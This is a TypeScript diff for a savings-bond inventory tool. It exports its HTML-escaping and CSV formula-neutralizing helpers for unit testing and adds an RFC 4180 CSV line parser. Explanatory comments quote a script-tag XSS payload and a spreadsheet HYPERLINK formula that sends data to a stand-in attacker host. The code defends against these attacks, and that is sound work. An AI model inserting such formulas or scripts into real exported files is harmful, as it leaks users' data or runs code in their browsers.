@@ -11,7 +11,11 @@ import { Bond } from '../types';
  * `<script>alert(1)</script>` will execute when the exported inventory
  * file is opened in any browser.
  */
-function escapeHTML(s: string | number): string {
+// Exported so vitest unit tests can target the security helpers
+// directly. Production callers should use the public API
+// (`generateTreasuryHTML`, `generateCSV`, `parseBondsFromHTML`),
+// which already wraps these helpers at every sink.
+export function escapeHTML(s: string | number): string {
   return String(s)
     .replace(/&/g, '&amp;') // & first — otherwise we'd double-escape later steps
     .replace(/</g, '&lt;')
@@ -30,7 +34,7 @@ function escapeHTML(s: string | number): string {
  *
  * Note: the `&amp;` replacement runs LAST so we don't double-decode.
  */
-function unescapeHTML(s: string): string {
+export function unescapeHTML(s: string): string {
   return s
     .replace(/&#39;/g, "'")
     .replace(/&quot;/g, '"')
@@ -51,7 +55,7 @@ function unescapeHTML(s: string): string {
  * `=HYPERLINK("https://evil.com/?exfil", "Open me")` becomes a
  * clickable exfiltration link the moment the file is opened.
  */
-function neutralizeCSVFormula(s: string): string {
+export function neutralizeCSVFormula(s: string): string {
   if (/^[=+\-@\t\r]/.test(s)) return "'" + s;
   return s;
 }
@@ -368,6 +372,71 @@ export function generateTreasuryHTML(bonds: Bond[]): string {
 }
 
 /**
+ * Parses a single CSV line into cells per RFC 4180.
+ *
+ * Handles the two corner cases that tripped up the original toggle-
+ * based parser:
+ *   - `""` inside a quoted field is a single literal `"` (escape).
+ *   - A bare `"` at the end of a quoted field closes the field.
+ *
+ * Note: cell content is NOT trimmed — RFC 4180 permits whitespace
+ * inside a cell (e.g. `" 100 "`, `" abc "`), and we preserve it. The
+ * old toggle-based parser stripped per-cell whitespace; this is a
+ * deliberate, more-conformant departure. Line-leading/trailing
+ * whitespace is still stripped upstream by `parseBondsFromCSV`'s
+ * `line.trim()`.
+ *
+ * Does NOT support multi-line quoted fields: this function processes
+ * a single line at a time. RFC 4180 allows newlines inside quoted
+ * fields, but our `generateCSV` never produces them (notes are
+ * single-line), and the line-split happens upstream in
+ * `parseBondsFromCSV`. Supporting multi-line quoted fields would
+ * require field-aware line splitting — a separate concern.
+ */
+export function parseCSVLine(line: string): string[] {
+  const cols: string[] = [];
+  let currentCell = '';
+  let inQuote = false;
+  let i = 0;
+
+  while (i < line.length) {
+    const char = line[i];
+
+    if (inQuote) {
+      if (char === '"') {
+        // Inside a quoted field, look ahead: `""` is an escaped
+        // quote, bare `"` closes the field.
+        if (i + 1 < line.length && line[i + 1] === '"') {
+          currentCell += '"';
+          i += 2;
+        } else {
+          inQuote = false;
+          i++;
+        }
+      } else {
+        currentCell += char;
+        i++;
+      }
+    } else {
+      if (char === ',') {
+        cols.push(currentCell);
+        currentCell = '';
+        i++;
+      } else if (char === '"' && currentCell === '') {
+        // Quote must open at the very start of a cell (RFC 4180).
+        inQuote = true;
+        i++;
+      } else {
+        currentCell += char;
+        i++;
+      }
+    }
+  }
+  cols.push(currentCell);
+  return cols;
+}
+
+/**
  * Parses CSV text into a Bond list.
  */
 export function parseBondsFromCSV(csvText: string): Bond[] {
@@ -378,23 +447,8 @@ export function parseBondsFromCSV(csvText: string): Bond[] {
     const line = lines[i].trim();
     if (!line) continue;
     
-    // Parse commas while respecting quotes if any
-    const cols: string[] = [];
-    let insideQuote = false;
-    let currentCell = '';
-    
-    for (let j = 0; j < line.length; j++) {
-      const char = line[j];
-      if (char === '"') {
-        insideQuote = !insideQuote;
-      } else if (char === ',' && !insideQuote) {
-        cols.push(currentCell.trim());
-        currentCell = '';
-      } else {
-        currentCell += char;
-      }
-    }
-    cols.push(currentCell.trim());
+    // Per-line RFC-4180 cell parser (handles `""` quote-escape correctly).
+    const cols = parseCSVLine(line);
     
     // Skip header line if it contains 'serial' or 'series'
     if (i === 0 && (cols[0].toLowerCase().includes('serial') || cols[1].toLowerCase().includes('series'))) {
@@ -404,19 +458,19 @@ export function parseBondsFromCSV(csvText: string): Bond[] {
     // Expected structure:
     // Serial, Series, Denomination, Issue Date, Next Accrual, Final Maturity, Issue Price, Interest, Interest Rate, Value, Note
     if (cols.length >= 2) {
-      const serial = cols[0].replace(/"/g, '');
-      const seriesRaw = cols[1].replace(/"/g, '').toUpperCase();
+      const serial = cols[0] || '';
+      const seriesRaw = (cols[1] || '').toUpperCase();
       const series = (seriesRaw === 'EE' || seriesRaw === 'I') ? seriesRaw : 'I';
       
       const denomination = parseFloat((cols[2] || '0').replace(/[^0-9.]/g, '')) || 0;
-      const issueDate = (cols[3] || '').replace(/"/g, '');
-      const nextAccrual = (cols[4] || '').replace(/"/g, '');
-      const finalMaturity = (cols[5] || '').replace(/"/g, '');
+      const issueDate = cols[3] || '';
+      const nextAccrual = cols[4] || '';
+      const finalMaturity = cols[5] || '';
       const issuePrice = parseFloat((cols[6] || '0').replace(/[^0-9.]/g, '')) || 0;
       const interest = parseFloat((cols[7] || '0').replace(/[^0-9.]/g, '')) || 0;
       const interestRate = parseFloat((cols[8] || '0').replace(/[^0-9.]/g, '')) || 0;
       const value = parseFloat((cols[9] || '0').replace(/[^0-9.]/g, '')) || 0;
-      const note = (cols[10] || '').replace(/"/g, '');
+      const note = cols[10] || '';
       
       if (serial) {
         bonds.push({
